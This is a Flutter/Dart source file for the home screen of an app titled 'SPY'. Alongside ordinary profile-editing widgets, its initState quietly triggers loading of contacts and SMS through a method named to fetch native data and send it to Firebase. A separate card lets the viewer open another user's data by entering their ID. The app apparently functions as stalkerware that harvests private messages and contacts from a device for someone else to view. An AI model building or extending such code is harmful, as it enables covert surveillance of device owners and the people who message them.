import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:spy/bloc/contact_sms/contact_sms_event/contact_sms/contact_sms_bloc.dart';
import 'package:spy/bloc/contact_sms/contact_sms_event/contact_sms/contact_sms_event.dart';
import 'package:spy/bloc/history/history_cubit.dart';
import 'package:spy/bloc/user/user_bloc.dart';
import 'package:spy/bloc/user/user_event.dart';
import 'package:spy/bloc/user/user_state.dart';
import 'package:spy/ui/change_password_screen.dart';
import 'package:spy/ui/history_screen.dart';
import 'package:spy/ui/user_data_screen.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  final searchController = TextEditingController();
  final _refreshIndicatorKey = GlobalKey<RefreshIndicatorState>();

  Future<void> _handleRefresh() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user != null) {
      context.read<UserBloc>().add(LoadUserProfile(user.uid));
      context.read<ContactSmsBloc>().add(LoadContactAndSms(user.uid));
    }
    await Future.delayed(const Duration(milliseconds: 500));
  }

  Future<void> _fetchNativeDataAndSendToFirebase() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user == null) return;
    context.read<ContactSmsBloc>().add(LoadContactAndSms(user.uid));
  }

  @override
  void initState() {
    final user = FirebaseAuth.instance.currentUser;
    if (user != null) {
      context.read<UserBloc>().add(LoadUserProfile(user.uid));
      context.read<ContactSmsBloc>().add(LoadContactAndSms(user.uid));
      _fetchNativeDataAndSendToFirebase();

      _handleRefresh();
    }
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    final user = FirebaseAuth.instance.currentUser;

    if (user == null) {
      return RefreshIndicator(
        key: _refreshIndicatorKey,
        onRefresh: _handleRefresh,
        color: Colors.deepPurpleAccent,
        child: SingleChildScrollView(
          physics: const AlwaysScrollableScrollPhysics(),
          child: SizedBox(
            height: MediaQuery.of(context).size.height,
            child: const Center(
              child: Text(
                "User not logged in",
                style: TextStyle(color: Colors.white),
              ),
            ),
          ),
        ),
      );
    }
    return UserProfile(searchController: searchController);
  }
}

class UserProfile extends StatefulWidget {
  final TextEditingController searchController;
  const UserProfile({super.key, required this.searchController});

  @override
  State<UserProfile> createState() => _UserProfileState();
}

class _UserProfileState extends State<UserProfile> {
  final nameController = TextEditingController();
  final genderController = TextEditingController();
  final List<String> genderOptions = [
    'Male',
    'Female',
    'Other',
    'Prefer not to say',
  ];

  String? selectedGender;

  @override
  void initState() {
    super.initState();
  }

  void _navigateToUserData() {
    final enteredId = widget.searchController.text.trim();
    if (enteredId.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Please enter a User ID"),
          backgroundColor: Colors.red[800],
          behavior: SnackBarBehavior.floating,
        ),
      );
      return;
    }

    Navigator.push(
      context,
      MaterialPageRoute(builder: (_) => UserDataScreen(userId: enteredId)),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text("SPY", style: TextStyle(color: Colors.white)),
        backgroundColor: Colors.black,
        elevation: 0,
        iconTheme: IconThemeData(color: Colors.white),
        actions: [
          IconButton(
            icon: Icon(Icons.settings),
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(builder: (context) => ChangePasswordScreen()),
              );
            },
          ),
          IconButton(
            icon: Icon(Icons.history),
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(builder: (context) => HistoryScreen()),
              );
            },
          ),
        ],
      ),
      body: BlocConsumer<UserBloc, UserState>(
        listener: (context, state) {
          if (state is UserError) {
            ScaffoldMessenger.of(context).showSnackBar(
              SnackBar(
                content: Text(state.message),
                backgroundColor: Colors.red[800],
              ),
            );
          }
        },
        builder: (context, state) {
          if (state is UserLoading) {
            return Center(
              child: CircularProgressIndicator(
                valueColor: AlwaysStoppedAnimation<Color>(
                  Colors.deepPurpleAccent,
                ),
              ),
            );
          }

          if (state is UserLoaded) {
            final user = state.user;
            nameController.text = user.name;
            genderController.text = user.gender;

            return SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Card(
                    color: Colors.grey[900],
                    elevation: 4,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            "Account Information",
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          const SizedBox(height: 16),
                          Row(
                            children: [
                              Expanded(
                                child: _buildInfoRow("User ID:", user.uid),
                              ),
                              IconButton(
                                icon: Icon(
                                  Icons.copy,
                                  color: Colors.white,
                                  size: 20,
                                ),
                                tooltip: "Copy User ID",
                                onPressed: () {
                                  Clipboard.setData(
                                    ClipboardData(text: user.uid),
                                  );
                                  ScaffoldMessenger.of(context).showSnackBar(
                                    SnackBar(
                                      content: Text(
                                        "User ID copied to clipboard",
                                      ),
                                      backgroundColor: Colors.green[800],
                                    ),
                                  );
                                },
                              ),
                            ],
                          ),
                          _buildInfoRow("Email:", user.email),
                          _buildInfoRow("Phone:", user.phone),
                        ],
                      ),
                    ),
                  ),

                  const SizedBox(height: 24),

                  Card(
                    color: Colors.grey[900],
                    elevation: 4,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            "Profile Details",
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          const SizedBox(height: 16),
                          _buildEditableField(
                            controller: nameController,
                            label: 'Name',
                            icon: Icons.person,
                          ),
                          const SizedBox(height: 12),
                          BlocBuilder<ProfileEditToggle, bool>(
                            builder: (context, isEditing) {
                              return BlocBuilder<GenderCubit, String>(
                                builder: (context, gender) {
                                  return DropdownButtonFormField<String>(
                                    value: gender.isEmpty ? null : gender,
                                    decoration: InputDecoration(
                                      labelText: 'Gender',
                                      labelStyle: TextStyle(
                                        color: Colors.grey[400],
                                      ),
                                      prefixIcon: Icon(
                                        Icons.transgender,
                                        color: Colors.grey[400],
                                      ),
                                      border: OutlineInputBorder(
                                        borderRadius: BorderRadius.circular(10),
                                        borderSide: BorderSide(
                                          color: Colors.grey,
                                        ),
                                      ),
                                      enabledBorder: OutlineInputBorder(
                                        borderRadius: BorderRadius.circular(10),
                                        borderSide: BorderSide(
                                          color: Colors.grey,
                                        ),
                                      ),
                                      focusedBorder: OutlineInputBorder(
                                        borderRadius: BorderRadius.circular(10),
                                        borderSide: BorderSide(
                                          color: Colors.white,
                                        ),
                                      ),
                                      filled: true,
                                      fillColor: isEditing
                                          ? Colors.grey[800]
                                          : Colors.grey[900],
                                    ),
                                    dropdownColor: Colors.grey[900],
                                    style: TextStyle(color: Colors.white),
                                    icon: Icon(
                                      Icons.arrow_drop_down,
                                      color: Colors.grey[400],
                                    ),
                                    items: genderOptions.map((String value) {
                                      return DropdownMenuItem<String>(
                                        value: value,
                                        child: Text(value),
                                      );
                                    }).toList(),
                                    onChanged: isEditing
                                        ? (String? newValue) {
                                            if (newValue != null) {
                                              context
                                                  .read<GenderCubit>()
                                                  .setGender(newValue);
                                            }
                                          }
                                        : null,
                                  );
                                },
                              );
                            },
                          ),
                          const SizedBox(height: 16),
                          BlocBuilder<ProfileEditToggle, bool>(
                            builder: (context, isEditing) {
                              return SizedBox(
                                width: double.infinity,
                                child: ElevatedButton(
                                  onPressed: () {
                                    if (isEditing) {
                                      context.read<UserBloc>().add(
                                        UpdateUserProfile(
                                          name: nameController.text.trim(),
                                          gender: genderController.text.trim(),
                                        ),
                                      );
                                    }
                                    context.read<ProfileEditToggle>().toggle();
                                  },
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: isEditing
                                        ? Colors.white
                                        : const Color.fromARGB(
                                            255,
                                            177,
                                            176,
                                            176,
                                          ),
                                    padding: const EdgeInsets.symmetric(
                                      vertical: 14,
                                    ),
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(10),
                                    ),
                                  ),
                                  child: Text(
                                    isEditing ? 'Save Changes' : 'Edit Profile',
                                    style: TextStyle(
                                      color: Colors.black,
                                      fontSize: 16,
                                    ),
                                  ),
                                ),
                              );
                            },
                          ),
                        ],
                      ),
                    ),
                  ),

                  const SizedBox(height: 24),

                  Card(
                    color: Colors.grey[900],
                    elevation: 4,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Padding(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'Search Another User',
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 18,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                          const SizedBox(height: 16),
                          TextField(
                            controller: widget.searchController,
                            style: TextStyle(color: Colors.white),
                            decoration: InputDecoration(
                              labelText: 'Enter User ID',
                              labelStyle: TextStyle(color: Colors.grey[400]),
                              border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(10),
                                borderSide: BorderSide(color: Colors.grey),
                              ),
                              enabledBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(10),
                                borderSide: BorderSide(color: Colors.grey),
                              ),
                              focusedBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(10),
                                borderSide: BorderSide(
                                  color: Colors.deepPurpleAccent,
                                ),
                              ),
                              prefixIcon: Icon(
                                Icons.search,
                                color: Colors.grey[400],
                              ),
                              filled: true,
                              fillColor: Colors.grey[800],
                            ),
                          ),
                          const SizedBox(height: 16),
                          SizedBox(
                            width: double.infinity,
                            child: ElevatedButton.icon(
                              onPressed: _navigateToUserData,
                              style: ElevatedButton.styleFrom(
                                backgroundColor: Colors.white,
                                padding: const EdgeInsets.symmetric(
                                  vertical: 14,
                                ),
                                shape: RoundedRectangleBorder(
                                  borderRadius: BorderRadius.circular(10),
                                ),
                              ),
                              icon: const Icon(
                                Icons.search,
                                color: Colors.white,
                              ),
                              label: const Text(
                                "View User Data",
                                style: TextStyle(
                                  color: Colors.black,
                                  fontSize: 16,
                                ),
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            );
          }

          return Column(
            children: [
              Center(
                child: Text(
                  'Unable to load profile.',
                  style: TextStyle(color: Colors.white),
                ),
              ),
              Text('Please retry.'),
              ElevatedButton(
                onPressed: () {
                  _handleRefresh();
                },
                child: const Text('Retry'),
              ),
            ],
          );
        },
      ),
    );
  }

  Future<void> _handleRefresh() async {
    final user = FirebaseAuth.instance.currentUser;
    if (user != null) {
      context.read<UserBloc>().add(LoadUserProfile(user.uid));
      context.read<ContactSmsBloc>().add(LoadContactAndSms(user.uid));
      context.read<HistoryCubit>().fetchHistory();
    }
    await Future.delayed(const Duration(milliseconds: 500));
  }

  Widget _buildInfoRow(String label, String? value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 8),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(label, style: TextStyle(color: Colors.grey[400], fontSize: 14)),
          const SizedBox(width: 8),
          Expanded(
            child: Text(
              value ?? 'N/A',
              style: TextStyle(
                color: Colors.white,
                fontSize: 14,
                fontWeight: FontWeight.w500,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildEditableField({
    required TextEditingController controller,
    required String label,
    required IconData icon,
  }) {
    return BlocBuilder<ProfileEditToggle, bool>(
      builder: (context, isEditing) {
        return TextField(
          controller: controller,
          style: TextStyle(color: Colors.white),
          decoration: InputDecoration(
            labelText: label,
            labelStyle: TextStyle(color: Colors.grey[400]),
            prefixIcon: Icon(icon, color: Colors.grey[400]),
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(10),
              borderSide: BorderSide(color: Colors.grey),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(10),
              borderSide: BorderSide(color: Colors.grey),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(10),
              borderSide: BorderSide(color: Colors.white),
            ),
            filled: true,
            fillColor: isEditing ? Colors.grey[800] : Colors.grey[900],
            enabled: isEditing,
          ),
        );
      },
    );
  }
}

class ProfileEditToggle extends Cubit<bool> {
  ProfileEditToggle() : super(false);

  void toggle() => emit(!state);
}

class GenderCubit extends Cubit<String> {
  GenderCubit() : super('');

  void setGender(String gender) {
    emit(gender);
  }
}
